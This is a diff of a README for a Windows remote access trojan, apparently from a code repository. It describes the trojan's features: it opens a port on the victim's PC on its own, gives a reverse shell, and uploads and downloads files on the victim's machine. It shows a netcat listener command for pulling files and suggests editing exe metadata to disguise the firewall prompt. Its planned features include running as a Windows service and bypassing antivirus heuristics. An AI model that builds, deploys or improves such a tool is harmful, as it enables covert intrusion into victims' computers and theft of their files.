@@ -9,10 +9,11 @@ NO additional dll's or configuration files
 Only one .exe and netcat on your side.
 
 # What RAT can
-1. After connection on specified port (provided in JSON file, which can be changed as you wish and should be merged into exe after that by using provided tool), gives reverse shell.
-2. Is able to download any files from victim's PC on specified port (provided in JSON file) and upload files on victim PC, no need for server setup or anything, only netcat on your side and launched RAT on victim's side :)
+1. Auto-open port on victim PC
+2. After connection on specified port (provided in JSON file, which can be changed as you wish and should be merged into exe after that by using provided tool), gives reverse shell.
+3. Is able to download any files from victim's PC on specified port (provided in JSON file) and upload files on victim PC, no need for server setup or anything, only netcat on your side and launched RAT on victim's side :)
 ### How to download files:
-1. Put netcat on listening state (ncat -v -l -p "port for file download from JSON" > "file name with extension that you want to download")
+4. Put netcat on listening state (ncat -v -l -p "port for file download from JSON" > "file name with extension that you want to download")
 
 Example: ncat -v -l -p 8889 > helloworld2.exe
 
@@ -51,9 +52,10 @@ Process:
 ![rat-upload](https://user-images.githubusercontent.com/53906830/110226904-37029180-7ef3-11eb-897b-8c7db2e9a581.png)
 
 ## Downsides
-1. Is detected by Kasperky (Heuristic) on full protection as Trojan.Win32.Generic
-2. High .exe application size (35 MB) 
-3. High memory usage
+1. During first launch Windows Firewall will give popup asking user if he allows RAT to access firewall (i.e open port), data that is provided can be modified by editing exe metadata.
+2. Is detected by Kasperky (Heuristic) on full protection as Trojan.Win32.Generic
+3. High .exe application size (35 MB) 
+4. High memory usage
 
 ![rat-memory](https://user-images.githubusercontent.com/53906830/110226932-73ce8880-7ef3-11eb-9f0e-b455832e95b4.png)
 
@@ -62,6 +64,5 @@ From one side those are problems for sure, from other side you could mask progra
 
 ### Features To Be Done: 
 
-1. Automatic ports opening required for communication;
-2. RAT as Windows Service (?)
-3. Bypass heuristic (?)
+1. RAT as Windows Service (?)
+2. Bypass heuristic (?)
